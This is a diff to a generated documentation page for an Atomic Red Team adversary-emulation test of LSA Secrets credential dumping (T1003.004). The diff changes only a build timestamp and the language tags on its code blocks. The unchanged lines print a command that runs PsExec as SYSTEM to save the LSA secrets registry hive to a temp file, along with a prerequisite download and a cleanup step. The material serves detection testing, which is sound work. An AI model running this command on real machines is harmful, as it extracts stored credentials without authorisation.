@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.004"
 attack_technique_name: "OS Credential Dumping: LSA Secrets"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "55295ab0-a703-433b-9ca4-ae13807de12f"
@@ -55,13 +55,13 @@ PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe}
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{psexec_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"
 Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PSTools" -Force
 New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
@@ -75,13 +75,13 @@ Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe" "#{psexec
 
 ### Command
 
-```commandprompt
+```cmd
 "#{psexec_exe}" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del %temp%\secrets >nul 2> nul
 ```
 
